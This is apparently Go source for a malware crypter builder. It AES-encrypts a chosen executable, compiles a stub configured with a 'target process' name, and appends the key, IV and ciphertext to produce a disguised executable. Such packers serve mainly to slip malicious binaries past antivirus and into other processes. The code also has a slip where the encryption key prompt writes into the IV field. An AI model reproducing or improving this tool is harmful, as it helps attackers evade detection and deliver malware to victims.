package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"text/template"
	"time"
)

const (
	stubDir      = "stub"
	allowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%0123456789"
	modeIV       = iota
	modeKey
)

type stubConfig struct {
	ProcName      string
	EncryptionKey string
	EncryptionIV  string
}

func createStub(stubCfg *stubConfig) []byte {
	f, err := os.Create("stub/vars.go")
	check(err)
	defer f.Close()

	tmpl, err := template.New("").Parse(`// Code generated automatically; DO NOT EDIT.
// Generated using data from user input
package main

var (
	key      = "{{.EncryptionKey}}"
	iv       = "{{.EncryptionIV}}"
	procName = "{{.ProcName}}"
)
`)
	check(err)
	tmpl.Execute(f, stubCfg)
	os.Chdir(stubDir)
	cmdOut, err := exec.Command("go", "build", ".").Output()
	check(err)
	if len(cmdOut) > 0 {
		fmt.Println(string(cmdOut))
	}
	stubBytes, err := ioutil.ReadFile("stub")
	check(err)
	os.Chdir("..")

	return stubBytes
}

func main() {
	stubCfg := &stubConfig{}
	srcFilePath, dstFilePath := userInput(stubCfg)

	srcBytes, err := ioutil.ReadFile(srcFilePath)
	check(err)
	encryptedBytes := aesEnc(srcBytes, stubCfg.EncryptionKey, stubCfg.EncryptionIV)

	fmt.Println("[!] Generating stub...")
	stubBytes := createStub(stubCfg)

	fmt.Println("[!] Creating final executable...")
	file, err := os.Create(dstFilePath)
	check(err)
	w := bufio.NewWriter(file)

	w.Write(stubBytes)
	w.Write([]byte(stubCfg.EncryptionKey))
	w.Write([]byte(stubCfg.EncryptionIV))
	w.Write(encryptedBytes)
	w.Flush()
	fmt.Println("[!] All done!")
}

// ## UTILS

func check(e error) {
	// Reading files requires checking most calls for errors.
	// This helper will streamline our error checks below.
	if e != nil {
		panic(e)
	}
}

func userInput(stubCfg *stubConfig) (string, string) {
	var srcFilePath string
	fmt.Print("[?] Path of file to be encrypted: ")
	fmt.Scanln(&srcFilePath)

	var dstFilePath string
	fmt.Print("[?] Path of output (encrypted) file: ")
	fmt.Scanln(&dstFilePath)

	fmt.Print("[?] Name of the target process: ")
	fmt.Scanln(&stubCfg.ProcName)

	fmt.Print("[?] Encryption key (32 bits - random if empty): ")
	fmt.Scanln(&stubCfg.EncryptionIV)
	fmt.Print("[?] Encryption IV (16 bits - random if empty): ")
	fmt.Scanln(&stubCfg.EncryptionIV)
	if stubCfg.EncryptionKey == "" {
		stubCfg.EncryptionKey = randKey(modeKey)
		stubCfg.EncryptionIV = randKey(modeIV)
	}
	fmt.Println()
	fmt.Printf("[!] Random encryption key (used in stub): %s\n", stubCfg.EncryptionKey)
	fmt.Printf("[!] Random encryption IV (used in stub): %s\n", stubCfg.EncryptionIV)
	return srcFilePath, dstFilePath
}

func randKey(mode int) string {
	var keySize int

	if mode == modeIV {
		keySize = 16
	} else if mode == modeKey {
		keySize = 32
	}

	key := make([]byte, keySize)
	for i := range key {
		key[i] = allowedChars[rand.Intn(len(allowedChars))]
	}
	return string(key)
}

func init() {
	rand.Seed(time.Now().UTC().UnixNano())
}

// ## aes.go
func aesEnc(srcBytes []byte, key string, iv string) []byte {
	block, err := aes.NewCipher([]byte(key))
	check(err)

	encrypter := cipher.NewCFBEncrypter(block, []byte(iv))
	encrypted := make([]byte, len(srcBytes))
	encrypter.XORKeyStream(encrypted, srcBytes)
	return encrypted
}
